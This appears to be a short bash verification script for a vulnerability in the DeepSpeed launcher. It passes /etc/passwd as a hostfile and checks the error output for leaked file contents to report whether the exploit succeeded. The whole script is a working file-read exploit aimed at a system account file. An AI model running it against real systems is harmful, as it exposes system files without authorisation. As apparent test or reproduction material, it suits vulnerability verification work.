#!/bin/bash

# Run the exploit command and capture output
OUTPUT=$(python -m deepspeed.launcher.runner --hostfile /etc/passwd test.py 2>&1)

# Check if the error message indicating successful file read is present
if echo "$OUTPUT" | grep -q "Bad hostfile text:" && echo "$OUTPUT" | grep -q "/usr/bin/false"; then
    echo "Verify: Exploit successful - Was able to read /etc/passwd contents"
    exit 0
else
    echo "Verify: Exploit failed - Could not read /etc/passwd contents"
    exit 1
fi
